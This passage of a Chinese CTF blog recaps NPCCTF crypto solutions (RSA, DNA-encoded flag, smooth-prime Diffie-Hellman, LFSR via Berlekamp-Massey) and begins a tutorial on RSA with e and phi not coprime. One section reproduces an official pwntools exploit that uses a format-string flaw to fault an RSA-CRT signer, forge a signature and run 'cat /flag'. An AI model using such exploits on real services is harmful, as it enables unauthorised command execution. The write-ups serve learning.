144091150656791885294463339584727879265256198198991073653628663376156887178012550858130757614613983484915065317350538883976985699134939611573042960790066164023344748678236482688754022510764186756583653133641013319778030947290249842389554899901303923240856508801296856919235057923994680746764691858073309808359p = 13265752525031277598749193582511402119401436301773279603834276696648524090566525345340535788599653371597390501163172105815650318160883283557455351397733637q = 11079536962260399440579867577796182350025055784603280643991792116408806832219819306252980113691988363196496955285790340961106337708724374056440534528513523phi = (p - 1) * (q - 1)d = mod_inverse(65537, phi)m = pow(c, d, n)print(long_to_bytes(m))# flag{5uch_@_simp13_Algo!!!!!rithm_qu3sti0n_willl_not_bee_dificult_4_U!}\n当然直接解方程\n1=a1p+b1  np\n1=a_1p+b_1\\;\\frac{n}{p}\n\n1=a1​p+b1​pn​\n也是可以的\n Ave Mujica2\n回旋镖来咯！我的心一直都是买够啊😭\nfrom Crypto.Util.number import *import randommes=b\"flag{?????}\"m=bytes_to_long(mes)def l2d(n):    if n == 0:        qd = [0,]        qd = []    while n &gt; 0:        n, r = divmod(n, 4)        qd.append(str(r))        dna=[]    base=[\"A\",\"T\",\"C\",\"G\"]    for i in reversed(qd):        dna.append(base[int(i)])    d=\"\".join(dna)        return ddef dbp(d):    bpd=[]    bp={\"A\":\"T\",\"T\":\"A\",\"C\":\"G\",\"G\":\"C\"}    for i in d:        bpd.append(bp[i])    pd=\"\".join(bpd)        return pddef mutation(d):    case=random.randint(1,3)    base=[\"A\",\"T\",\"C\",\"G\"]    n=len(d)    if case==1:        t=random.randint(1,n)        return d[0:t]+d[t+1:]    if case==2:        t=random.randint(1,n)        b=random.randint(0,3)        return d[0:t]+base[b]+d[t:]    if case==3:        t=random.randint(1,n)        b=random.randint(0,3)        return d[0:t]+base[b]+d[t+1:]dna1=l2d(m) # m转化为DNA序列dna2=dbp(dna1)d3=[]for i in range(10):    dna3=mutation(dna2)    dna3=mutation(dna3)    d3.append(dna3)print(d3)    \"\"\"...\"\"\"\n很有新意的一道题，先把mes转为长整数 再把整数转为四进制 0,1,2,3分别对应A,T,C,G也就是碱基对，然后dbp函数就是对碱基进行互补配对，mutation函数呢则是对DNA片段进行突变，删去某一个碱基，在某一个位置加入一个碱基，在某个位置进行碱基的替换\n给出了十条由mes转为的DNA片段进行两次基因突变后的结果，我们先分析长度\nd3=[...]leng=[]for i in d3:    leng.append(len(i))print(leng)# [137, 137, 134, 135, 136, 136, 135, 137, 138, 136]\n简单分析可知，两次突变对长度的影响最多为4（两次删去或者两次增加），这里最小值是134，最大是138，可以确定原DNA长度是136\n那么我们直接对比长度为134和138的片段\nAGAGACTAGTAAGACACGCATCAACAAACATCTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCAAGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCAGACTAACAAAGAAACTGAGAAAGATACACA\n可知最长的链删去4个碱基就是最短的DNA链，假设这四个位置分别为t1,t2,t3,t4t_1,t_2,t_3,t_4t1​,t2​,t3​,t4​ 那么有两个位置是原本DNA链中存在的，我们写个脚本穷举分析就行，当然也可以考虑136长度的链来手撕，总是我们能获得原本链是\nDNA2 = 'AGAGAGCTAGTAAGACACGCATCAACAAACATACTCACAAAGCAAGGATCCCATCAAGCCACTGACATAGGAACTCTGTAAATCAGGTAGAAAACCAGTCAGCCAGCGACTAACAAAGAAACTGAGAAAGATACCA'DNA1 = dbp(DNA2)print(DNA1)print(long_to_bytes(d2l(DNA1)))# flag{Mutsumi?Mortis!She_conquered}\n木子米🥒😭😭😭\n *Ez_DH\nfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom gmpy2 import next_primefrom hashlib import sha256import randomflag = b\"flag{******************************}\"def get_weak_prime(nbits):    while True:        p1 = 2        while p1 &lt; 2**nbits:            p1 *= int(next_prime(random.getrandbits(10)))        p = p1 + 1        if isPrime(p):            return p  p = get_weak_prime(512)q = get_weak_prime(512)n = p**11 * q**11phiN = (p-1)**11 *(q-1)**11g = 3x = random.randrange(0, n)X = pow(g, x, n)y = random.randrange(0, n)Y = pow(g, y, n)key1 = pow(X, y, n)key2 = pow(Y, x, n)assert key1 == key2key = sha256(str(key1).encode()).digest()print(f'{n = }')print(f'{X = }')print(f'{Y = }')print(AES.new(key=key,mode=AES.MODE_ECB).encrypt(pad(flag, 16)).hex())\n分为两个部分，get_weak_prime函数中生成的是p−1p-1p−1光滑的素数ppp，我们对nnn开11次方根就能得到pqpqpq,考虑Polard p-1分解\n我们知道p−1p-1p−1的素因子最多不超过2102^{10}210也就是1024，我们就取这个B=2048B=2048B=2048就可以分解了\ndef pollard_pm1(nn, B=2048):    a=2    for i in range(2, B):        a = pow(a, i, nn)        d = gcd(a-1, nn)        if d &gt; 1 and d &lt; nn:            return d            nn = n.nth_root(11)p = pollard_pm1(nn)q = nn//p\n求解出p,qp,qp,q之后就是离散对数问题了，我们要处理\nX  ≡  3x  mod  n\nX\\;\\equiv\\;3^x\\;mod\\;n\n\nX≡3xmodn\n转化到模两个大因子，即\nX  ≡  3x  mod  p11\nX\\;\\equiv\\;3^x\\;mod\\;p^{11}\n\nX≡3xmodp11\nX  ≡  3x  mod  q11\nX\\;\\equiv\\;3^x\\;mod\\;q^{11}\n\nX≡3xmodq11\n找到这两个下满足要求的解xxx就可以尝试打CRT还原出真正的xxx ，参考这篇博客\n模p^k的同余方程和离散对数求解_同余多项式与crypto-CSDN博客\n这里的思路貌似无法在常规时间内跑通\n不过官方解法给出了更简单的思路，虽然还未理解，姑且先记录下来\n即构造进数域(p,11)(p,11)(p,11)与(q,11)(q,11)(q,11)在这两个域下离散对数变为连续对数，直接计算即可，代码如下\nRp = Zp(p, 11)Rq = Zp(q, 11)xp = (Rp(X).log() / Rp(3).log()).lift()xq = (Rq(X).log() / Rq(3).log()).lift()\n注意截断\n考虑到这里ggg并非模p11p^{11}p11 q11q^{11}q11下的生成元 我们还需要转化到模p−1p-1p−1，q−1q-1q−1下来算一次\nodp = p-1R = Zmod(p**11)x_mod_odp = discrete_log(R(X) ** (p**10), R(3) ** (p**10), ord=ZZ(odp))odq = q-1R = Zmod(q**11)x_mod_odq = discrete_log(R(X) ** (q**10), R(3) ** (q**10), ord=ZZ(odq))\n最后打一组CRT就可以解出来xxx了\n *lfsr2\n#!/usr/bin/env python3# Native importsimport osfrom secrets import randbelowfrom typing import List# Flag import# Challenge classesclass LFSR:    def __init__(self, seed: bytes, taps: List[int]) -&gt; None:        self.state = [int(i) for i in '{:0{n}b}'.format(int.from_bytes(seed, 'big'), n=8*len(seed))]        self.taps = taps            def Run(self, k: int = 1) -&gt; List[int]:        out = []        for _ in range(k):            new = 0            for tap in self.taps:                new ^= self.state[tap]            out += [self.state[-1]]            self.state = [new] + self.state[:-1]        return out    class DuoLFSR:    def __init__(self, lfsrs: List[LFSR]) -&gt; None:        self.lfsrs = lfsrs            def Run(self, k: int = 1) -&gt; List[int]:        outs = []        for _ in range(k):            out = 0            for lfsr in self.lfsrs:                out ^= lfsr.Run(1)[0]            outs += [out]        return outs    # Challenge parametersTAPS = [-1]while len(TAPS) &lt; 32:    k = randbelow(8*len(FLAG) - 1)    if k not in TAPS:        TAPS += [k]lfsrFlag = LFSR(FLAG, TAPS)companion = b'\\x00' * 38lfsrCom = LFSR(companion, TAPS)lfsrDuo = DuoLFSR([lfsrFlag, lfsrCom])_ = lfsrDuo.Run(1337)resp=lfsrDuo.Run(2**(8 - 1) + 2**(8 + 1))resp = sum([j * 2**i for i,j in enumerate(resp)])print(resp)'''3385542783645760843169141796990072952050445818408752623233283796965016469557790365462752786263921869045735450584497427293344944230226908565071000276404789429460231179110335090238333057815893800'''\nlfsr问题，我们来分析一下代码\n类lfsr由初始态state和抽头taps构成，初始化的时候把传入的字符串转化为二进制01串作为初始状态state，每运行一轮，根据taps数组中的标示抽出对应的位数进行异或，再拼在当前state态的开头，所有位后移，把最后一位丢掉\n这里又定义了一个Duolfsr类，即把多个lfsr拼在一起，独立的同时运行并且改变自己的状态，但是结果是它们所有结果的异或\n注意到这里的lfsrCom元素初始state都是0，也就意味着抽头出来后异或的结果还是0然后任何输出和0异或也是本身，也就是说，这里的lfsrcom对结果没有任何影响，我们就当他不存在就行\n然后分析流程，用flag对lfsrFlag进行初始化，然后生成一个32位的抽头Taps\n接着空转1337轮，混淆一下，再转640轮，把这些01串输出为resp\n题干提示了berlekamp-massey算法 这是一种求数列最短递推公式的算法，刚好可以运用在lfsr中\n参考这篇博客\n线性反馈移位寄存器（LFSR）和 Berlekamp-Massey 算法_线性反馈移位寄存器例题具体算法-CSDN博客\n这里我们有一个640位长的生成序列resprespresp，要尝试去恢复这个304位的生成器（也就是找出taps）\n脚本如下\ndef berlekamp_massey(s):    n = len(s)    c,b = n*[0],n*[0]    c[0],b[0]=1,1    l,m,d = 0,-1,0    for i in range(n):        d = s[i]        for j in range(1,l+1):            d^=c[j]*s[i-j]        if d == 1:            t = c[:]            p = [0]*n            for j in range(n-i+m):                p[j+i-m]=b[j]            c = [c[j]^p[j] for j in range(n)]            if 2*l &lt;= i:                l,m,b = i+1-l,i,t    return [i for i ,bit in enumerate(c) if bit]taps = berlekamp_massey(p)taps = [i-1 for i in taps][1:]# print(taps)# [6, 13, 21, 26, 30, 35, 49, 72, 78, 81, 84, 98, 105, 123, 128, 136, 139, 158, 161, 171, 172, 173, 224, 231, 234, 250, 252, 255, 260, 269, 279, 303]\n我们获得tags之后再逆1337次恢复seed\n恢复过程中，我们知道，我们只需要关注最低位 最高位 和tags中的标记位数\n我们需要先截取304位的输出，再把tags对应的标志位记为1 那么然后我们\n\n先记下来当前的最高位tmp（也就是lfsr中的最后一步，拼接最高位）\n左移所有位（逆右移过程）\n根据左移后（lfsr中右移前原本的状态）的tags计算反馈位res\n如果res不等于tmp 最低位置1\n\n思路明确了，代码也很简洁\ndef xor(state,taps):    res = 0    for i in taps:        res^=state[i]    return resfor i in range(1337):    tmp=seed[0]    for i in range(1,304):        seed[i-1]=seed[i]    seed[303]=0    result = xor(seed, taps)    if result!=tmp:        seed[303]=1        seedstr = ''.join(map(str,seed))print(long_to_bytes(int(seedstr,2)))# flag{Use_Bm_tO_solve_the_Lfsr_problem}\n Final\n 小睦的脑袋股股涨涨的\npwn&amp;crypto\n\n题目要你做的大致就是破解这个数字签名系统，然后给cat flag签名，成功的读取出来\n在此先简述一下思路，是基于RSA-CRT加速版本的签名体系\nida分析给的运行文件，RSA生成的n,p,q存储在堆上，能发现存在后门9999 有一个格式化字符串存取漏洞\n本地爆破偏移找到p,q的地址，可以用这个存取漏洞修改 p或者q的值，然后就能很轻松的构造出私钥了\n受限于笔者自身实力还较为不足无法进行更细一步的复现\n贴一下官方的exp\nfrom pwn import *from Crypto.Util.number import bytes_to_long, GCD#r=process(\"./challenge\")r=remote(\"127.0.0.1\", 14520)def choice(num):    r.sendlineafter(b\"&gt; \", str(num).encode())def get_pubkey():    choice(1)    r.recvuntil(b\"n = \")    n = int(r.recvline().strip())    r.recvuntil(b\"e = \")    e = int(r.recvline().strip())    return n, edef injectFault(offset):    choice(9999)    sleep(0.1)    r.sendline(str(offset).encode())    sleep(0.1)    r.sendline(b\"%7$n\")    sleep(0.1)def CallMortis():    choice(114)    r.sendlineafter(b\"&gt; \", str(0).encode())    r.recvuntil(b\"sign = \")    sign = int(r.recvline().strip())    return signdef Execute(n,e,s,cmd):    choice(2)    m = bytes_to_long(b\"ls -la /\")    p = GCD(pow(s, e, n) - m, n)    q = n // p     assert(p * q == n)    d = pow(e, -1, (p - 1) * (q - 1))    sign = pow(bytes_to_long(cmd), d, n)    r.sendlineafter(b\"&gt; \",cmd)    r.sendlineafter(b\"&gt; \",str(sign).encode())n,e=get_pubkey()success(b\"n=\")print(n)success(b\"e=\")print(e)injectFault(-2413)s=CallMortis()success(b\"s=\")print(s)cmd = b\"cat /flag\"\tExecute(n,e,s,cmd)r.interactive()# flag{Go_to_tomorrow_A_beautiful_era_People_will_gradually_forget_and_everything_will_eventually_disappear}# mutsumi.....\n 碎碎念\n很感谢这次npcctf的出题师傅，虽然离完赛已经过去一段时间了，但是在此复盘还是有很大的收获，自己在LLL DLP等问题上也有了进一步的理解，希望明年参加的时候会是更强的自己吧\n","categories":["复现"],"tags":["CTF","DLP","LFSR","LLL"]},{"title":"RSA--e与phi不互素","url":"/2025/04/28/RSA-e%E4%B8%8Ephi%E4%B8%8D%E4%BA%92%E7%B4%A0/","content":" 前言\n我们知道，在RSA系统中，解密依赖于欧拉定理\naϕ(p)≡1  mod  p  ,  (a,p)=1\na^{\\phi(p)}\\equiv1\\;mod\\;p\\;,\\;(a,p)=1\\\\\n\naϕ(p)≡1modp,(a,p)=1\n以及同余等式\ned≡1  mod  ϕ(n)\ned\\equiv1\\;mod\\;\\phi(n)\\\\\n\ned≡1modϕ(n)\n,那么在已知\nc≡  me  mod  n\nc\\equiv\\;m^{e}\\;mod\\;n\n\nc≡memodn\n下，容易得到\ncd≡  (me)d  mod  n\nc^{d}\\equiv\\;(m^{e})^{d}\\;mod\\;n\\\\\n\ncd≡(me)dmodn\ned=1+kϕ(n)\ned=1+k\\phi(n)\\\\\n\ned=1+kϕ(n)\ncd≡  m∗mkϕ(n)  ≡  m∗1  mod  n\nc^{d}\\equiv\\;m*m^{k\\phi(n)}\\;\\equiv\\;m*1\\;mod\\;n\\\\\n\ncd≡m∗mkϕ(n)≡m∗1modn\n但是当e,phie,phie,phi不互素的情况下，私钥ddd就无法正常计算，在此之下想要顺利求解明文mmm,衍生了一系列问题，本文基于笔者日常中遇到的相关题型，给出对应的处理方法\n 从简单情况出发\n我们不妨令\ngcd(e,ϕ)=t\ngcd(e,\\phi)=t\\\\\n\ngcd(e,ϕ)=t\nte′=e\nte^{'}=e\\\\\n\nte′=e\n那么考虑转化为公钥指数为e′e^{'}e′的RSA，有\ne′d′≡1modϕ(n)\ne^{'}d^{'}\\equiv1mod\\phi(n)\\\\\n\ne′d′≡1modϕ(n)\nc≡  me≡  mte′  mod  n\nc\\equiv\\;m^{e}\\equiv\\;m^{te^{'}}\\;mod\\;n\\\\\n\nc≡me≡mte′modn\ncd′≡  mte′d′  ≡  mt  mod  n\nc^{d^{'}}\\equiv\\;m^{te^{'}d^{'}}\\;\\equiv\\;m^{t}\\;mod\\;n\\\\\n\ncd′≡mte′d′≡mtmodn\n显然此时我们能够计算\ncd′  mod  n\nc^{d^{'}}\\;mod\\;n\\\\\n\ncd′modn\n如果ttt不是很大（个位数），当mt&lt;nm^{t}&lt;nmt&lt;n的时候，我们直接能得到\ncd′  mod  n=mt\nc^{d^{'}}\\;mod\\;n=m^{t}\\\\\n\ncd′modn=mt\n，直接开ttt次方就能得到mmm\n如果mtm^{t}mt不那么大的话，我们姑且还能尝试爆破\ncd′=kn+mt\nc^{d^{'}}=kn+m^{t}\\\\\n\ncd′=kn+mt\n，但是如果数据不支持，大到爆破不了，我们就得进一步观察已有数据中的代数结构了\n 如果eee同时与p−1p-1p−1，q−1q-1q−1互质（CRT加速RSA问题）\n这里也就是在RSA中使用CRT算法加速运算的例子，我们都来讲讲如何操作\n\n为什么要用CRT？\n\n在RSA的计算中，我们有\ned≡1  mod  ϕ(n)\ned\\equiv1\\;mod\\;\\phi(n)\\\\\n\ned≡1modϕ(n)\nc≡  md  modn\nc\\equiv\\;m^d\\;modn\\\\\n\nc≡mdmodn\n，我们知道n=pqn=pqn=pq，nnn往往非常大，那么计算上面两个式子就非常的消耗时间，而且也需要(e,ϕ)=1(e,\\phi)=1(e,ϕ)=1,我们注意到p,qp,qp,q也是两个大质数，很有可能eee与即p−1    (ϕ(p))p-1\\;\\;(\\phi(p))p−1(ϕ(p))   ;   即q−1    (ϕ(q))q-1\\;\\;(\\phi(q))q−1(ϕ(q))也互素，那么我能就能把问题转化到模p,qp,qp,q 下来讨论，下面是推导过程\n由c≡  me  mod  n\n由c\\equiv\\;m^{e}\\;mod\\;n\\\\\n\n由c≡memodn\nc≡  me  mod  p\nc\\equiv\\;m^e\\;mod\\;p\\\\\n\nc≡memodp\nc≡  me  mod  q\nc\\equiv\\;m^e\\;mod\\;q\\\\\n\nc≡memodq\n这是由于q∣n  ;p∣nq|n\\;;p|nq∣n;p∣n也就是模的传递性，那么我们转过来计算在模p,qp,qp,q下的私钥dp;dqd_p;d_qdp​;dq​，即\nedp≡1  mod  ϕ(p)\nedp\\equiv1\\;mod\\;\\phi(p)\\\\\n\nedp≡1modϕ(p)\nedq≡1  mod  ϕ(q)\ned_q\\equiv1\\;mod\\;\\phi(q)\\\\\n\nedq​≡1modϕ(q)\n那么在解密的时候就有\ncdp≡  medp≡  m1+kϕ(p)  ≡  m  mod  p\nc^{d_p}\\equiv\\;m^{ed_p}\\equiv\\;m^{1+k\\phi(p)}\\;\\equiv\\;m\\;mod\\;p\\\\\n\ncdp​≡medp​≡m1+kϕ(p)≡mmodp\ncdq≡  medq≡  m1+kϕ(q)  ≡  m  mod  q\nc^{d_q}\\equiv\\;m^{ed_q}\\equiv\\;m^{1+k\\phi(q)}\\;\\equiv\\;m\\;mod\\;q\\\\\n\ncdq​≡medq​≡m1+kϕ(q)≡mmodq\n记cdp≡  m  mod  p    =m1    cdq≡  m  mod  q    =m2\n记c^{d_p}\\equiv\\;m\\;mod\\;p\\;\\;=m_1\\;\\;c^{d_q}\\equiv\\;m\\;mod\\;q\\;\\;=m_2\\\\\n\n记cdp​≡mmodp=m1​cdq​≡mmodq=m2​\n这里是因为mmm可能比nnn要大，所以我们无法直接解出来，然后我们根据中国剩余定理可以构造出一个对mmm的解，如下\n由第二个同余式不妨设\nm=m2+hq  \nm=m_2+hq\\;\\\\\n\nm=m2​+hq\n我们进而只需要解出来hhh,把这个式子带入另一个同余式\nm2+hq≡  m1mod  p\nm_2+hq\\equiv\\;m_1mod\\;p\\\\\n\nm2​+hq≡m1​modp\nhq≡(m1−m2)  mod  p\nhq\\equiv(m_1-m_2)\\;mod\\;p\\\\\n\nhq≡(m1​−m2​)modp\n我们只需计算\nIq≡  q−1  mod  p\nI_q\\equiv\\;q^{-1}\\;mod\\;p\\\\\n\nIq​≡q−1modp\n那么有\nh≡  Iq(m1−m2)  mod  p\nh\\equiv\\;I_q(m_1-m_2)\\;mod\\;p\\\\\n\nh≡Iq​(m1​−m2​)modp\n得到hhh之后回代即可成功求出mmm\n可见这里我们的计算都是在模p,qp,qp,q的式子中进行的，乘法运算的次数少了不少，实现了加速\n说回正题，从上面不难看出，我们自始至终都没有尝试计算ed≡1  mod  ϕ(n)ed\\equiv1\\;mod\\;\\phi(n)ed≡1modϕ(n)，成功回避了这个问题\n来个例子–黑盾杯 2020-Factor\nn = 3454083680130687060405946528826790951695785465926614724373e = 3c = 1347530713288996422676156069761604101177635382955634367208gcd(m, n) = 1\n这里n不是很大，简单分解后能得到三个素因子，我们记为pqr，如下\np=11761833764528579549q=17100682436035561357r=17172929050033177661print(n-p*q*r) # 0print(gcd(e,phi)) # 3print(gcd(e,p-1)) # 1print(gcd(e,q-1)) # 3print(gcd(e,r-1)) # 1print(gcd(e,(p-1)*(r-1))) # 1\n简单检查了关系，如上，这题方法很多，在上面的解法下即利用(e,p−1)=(e,r−1)=1(e,p-1)=(e,r-1)=1(e,p−1)=(e,r−1)=1来使用CRT求解，代码如下\n#sagedp=inverse(e,p-1)dr=inverse(e,r-1)m1=pow(c,dp,p)m2=pow(c,dr,r)Ir=pow(r,-1,p)h=pow(Ir*(m1-m2),1,p)m=m2+h*rprint(long_to_bytes(m))# CMISCCTF{3_RSA}\n这里也能转化到在模prprpr下尝试求解，但是那对明文的大小有一定要求，我们还是使用通法，这里只要能找到两个满足要求的因子就行，但是这不是什么时候都能生效，请看下题\n强网杯2022–[ASR]\nfrom Crypto.Util.number import getPrimefrom secret import falgpad = lambda s:s + bytes([(len(s)-1)%16+1]*((len(s)-1)%16+1))n = getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2e = 3flag = pad(flag)print(flag)assert(len(flag) &gt;= 48)m = int.from_bytes(flag,'big')c = pow(m,e,n)print(f'n = {n}')print(f'e = {e}')print(f'c = {c}')n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001e = 3c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149\n注意到这里特别对m进行了填充，就是保证m比n的因子大，无法转化为在小因子的域下求解，看看下面这段失败的exp\nfrom Crypto.Util.number import *e = 3n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149p = 225933944608558304529179430753170813347q = 260594583349478633632570848336184053653r = 218566259296037866647273372633238739089t = 223213222467584072959434495118689164399print(gcd(e,p-1)) # 3print(gcd(e,q-1)) # 1print(gcd(e,r-1)) # 3print(gcd(e,t-1)) # 1dt=inverse(e,t-1)dq=inverse(e,q-1)m1=pow(c,dt,t)m2=pow(c,dq,q)Iq=pow(q,-1,t)h=pow(Iq*(m1-m2),1,t)m=m2+h*qprint(long_to_bytes(m))\n这里的确找到了满足(ai−1,e)=1(a_i-1,e)=1(ai​−1,e)=1的两个因子，但是我们注意到，若m=hq+m2m=hq+m_2m=hq+m2​又m2∈(0,q)m_2\\in(0,q)m2​∈(0,q),所以m∈(hq,(h+1)q)m\\in(hq,(h+1)q)m∈(hq,(h+1)q)我们在上述代码中解出来的hhh满足h∈(0,t)h\\in(0,t)h∈(0,t)，也就是说，如果m&gt;(1+t)qm&gt;(1+t)qm&gt;(1+t)q的时候，这个方法就暂时失效了，这是在多因子RSA下特别的问题，注意到我们还有两个因子没有使用，为了也能使用上它们，我们给出更加一般的方法\n 有限域开根\n想想我们的核心目标是什么？–求解mmm 那么我们为什么要找到这个(ai−1,e)=1(a_i-1,e)=1(ai​−1,e)=1的aia_iai​?重新捋一遍过程，我们就发现，是为了去计算daid_{a_i}dai​​来求解满足me≡  c  mod  aim^e\\equiv\\;c\\;mod\\;a_ime≡cmodai​的m≡  cdai  mod  aim\\equiv\\;c^{d_{a_i}}\\;mod\\;a_im≡cdai​​modai​,换言之，我们还是在求模不同素因子下的mmm,我们不妨想一下，daid_{a_i}dai​​真的重要吗？,我们看这个方程\nme−c≡0  mod  ai\nm^e-c\\equiv0\\;mod\\;a_i\\\\\n\nme−c≡0modai​\n这不就是在GF(ai)GF(a_i)GF(ai​)下的方程吗？这里eee还非常小，完全可以在这个有限域GF(ai)GF(a_i)GF(ai​)下来开根求解所有符合题意的mmm的取值集合MiM_iMi​，显然可能有多解，但是我们可以依次枚举M1,M2,M3,M4M_1,M_2,M_3,M_4M1​,M2​,M3​,M4​中的值，由上述分析，若(ak−1,e)=1(a_k-1,e)=1(ak​−1,e)=1，那么Mk={m  mod  ak}M_k=\\left\\{m\\;mod\\;a_k\\right\\}Mk​={mmodak​}否则也有m  mod  aj  ∈  Mjm\\;mod\\;a_j\\;\\in\\;M_jmmodaj​∈Mj​\n那么我们枚举这四个集合，一定能找到满足我们需要的\n{m1=m  mod  a1m2=m  mod  a2m3=m  mod  a3m4=m  mod  a4\n\\begin{cases}m_1=m\\;mod\\;a_1\\\\m_2=m\\;mod\\;a_2\\\\m_3=m\\;mod\\;a_3\\\\m_4=m\\;mod\\;a_4\\\\\\end{cases}\n\n⎩⎪⎪⎪⎪⎨⎪⎪⎪⎪⎧​m1​=mmoda1​m2​=mmoda2​m3​=mmoda3​m4​=mmoda4​​\n这就是中国剩余定理了，我们直接打CRT就能解出来m，而且我们用到了所有的因子，几乎可以保证mmm这里是唯一的，如果不是唯一的，我们确定一下n=paqbrctdn=p^{a}q^{b}r^{c}t^{d}n=paqbrctd中的a,b,c,da,b,c,da,b,c,d，转化到mmm模pa,  qb,  rc,  tdp^{a},\\;q^{b},\\;r^{c},\\;t^{d}pa,qb,rc,td下就行，下面是修改后的exp\n# sagefrom Crypto.Util.number import *from itertools import product# Given parameterse = 3n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149# Prime factorsp = 225933944608558304529179430753170813347q = 260594583349478633632570848336184053653r = 218566259296037866647273372633238739089t = 223213222467584072959434495118689164399# Create polynomial rings and find roots in each fieldR.&lt;x&gt; = Zmod(p)[]f = x^e - cres_p = f.monic().roots()R.&lt;x&gt; = Zmod(q)[]f = x^e - cres_q = f.monic().roots()R.&lt;x&gt; = Zmod(r)[]f = x^e - cres_r = f.monic().roots()R.&lt;x&gt; = Zmod(t)[]f = x^e - cres_t = f.monic().roots()# Iterate through all possible combinations of rootsfor (m_p, _) in res_p:    for (m_q, _) in res_q:        for (m_r, _) in res_r:            for (m_t, _) in res_t:                # Combine using CRT in stages                # First combine p and q                m_pq = crt(int(m_p), int(m_q), p, q)                # Then combine r and t                m_rt = crt(int(m_r), int(m_t), r, t)                # Finally combine the two results                m = crt(m_pq, m_rt, p*q, r*t)                                mes = long_to_bytes(m)                print(mes)        # b'flag{Fear_can_hold_you_prisoner_Hope_can_set_you_free}\\x06\\x06\\x06\\x06\\x06\\x06'\n在这个脚本下我们能解决大部分问题，但是当eee太大的时候我们就得考虑其他的方法来处理了\n根据题型，我们有几种应付的思路\nUCSCCTF2025–EzCalculate\n题面\np = 9586253455468582613875015189854230646329578628731744411408644831684238720919107792959420247980417763684885397749546095133107188260274536708721056484419031q = 8998523072192453101232205847855618180700579235012899613083663121402246420191771909612939404791268078655630846054784775118256720627970477420936836352759291n = p * qe = 65536c = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776phi = (p - 1) * (q - 1)print(gcd(e, phi)) # 4print(gcd(e, p - 1)) # 2print(gcd(e, q - 1)) # 2print(gcd(e,(p-1)//2)) # 1print(gcd(e,(q-1)//2)) # 1\n在这里，我们注意到eee同时与p−12\\frac{p-1}{2}2p−1​和q−12\\frac{q-1}{2}2q−1​互素，于是我们能有一个取巧的方法，先转化到对因子的同余式，即\nc≡  me  mod  p\nc\\equiv\\;m^e\\;mod\\;p\\\\\n\nc≡memodp\nc≡  me  mod  q\nc\\equiv\\;m^e\\;mod\\;q\\\\\n\nc≡memodq\n再不妨记\nsp=p−12\ns_p=\\frac{p-1}{2}\\\\\n\nsp​=2p−1​\nsq=q−12\ns_q=\\frac{q-1}{2}\\\\\n\nsq​=2q−1​\n容易有\n(e,sp)=(e,sq)=1\n(e,s_p)=(e,s_q)=1\\\\\n\n(e,sp​)=(e,sq​)=1\n那么必然存在\nedsp≡1  mod  sp\ned_{s_p}\\equiv1\\;mod\\;s_p\\\\\n\nedsp​​≡1modsp​\nedsq≡1  mod  sq\ned_{s_q}\\equiv1\\;mod\\;s_q\\\\\n\nedsq​​≡1modsq​\n写成等式，即\nedsq=1+ksq\ned_{s_q}=1+ks_q\\\\\n\nedsq​​=1+ksq​\nedsp=1+ksp\ned_{s_p}=1+ks_p\\\\\n\nedsp​​=1+ksp​\n我们考虑同余式\nmϕ(p)≡  mp−1≡  (msp)2≡1  mod  p\nm^{\\phi(p)}\\equiv\\;m^{p-1}\\equiv\\;(m^{s_p})^2\\equiv1\\;mod\\;p\n\nmϕ(p)≡mp−1≡(msp​)2≡1modp\n这里就初见端倪了，我们做一个换元\nxp=msp\nx_p=m^{s_p}\n\nxp​=msp​\n那不就是二次剩余的判别式吗\n是的二次剩余不是的二次剩余msp  mod  p  ≡  {1    ;msp  p−1    ;mspp\n是的二次剩余不是的二次剩余m^{s_p}\\;mod\\;p\\;\\equiv\\;\\begin{cases}1\\;\\;;m^{s_p}\\;p\\\\-1\\;\\;;m^{s_p}p\\end{cases}\n\n是的二次剩余不是的二次剩余msp​modp≡{1;msp​p−1;msp​p​\n注意到这里我们得到了重要的模ppp式子，回看解密过程\ncdsp≡  medsp≡  m1+ksp≡  m∗(msp)k\nc^{d_{s_p}}\\equiv\\;m^{ed_{s_p}}\\equiv\\;m^{1+k_{s_p}}\\equiv\\;m*(m^{s_p})^k\n\ncdsp​​≡medsp​​≡m1+ksp​​≡m∗(msp​)k\n也就是\ncdsp≡  ±  m  mod  p\nc^{d_{s_p}}\\equiv\\;\\pm\\;m\\;mod\\;p\n\ncdsp​​≡±mmodp\n也就是说我们有\nm1≡  m  ≡  ±  cdsp  mod  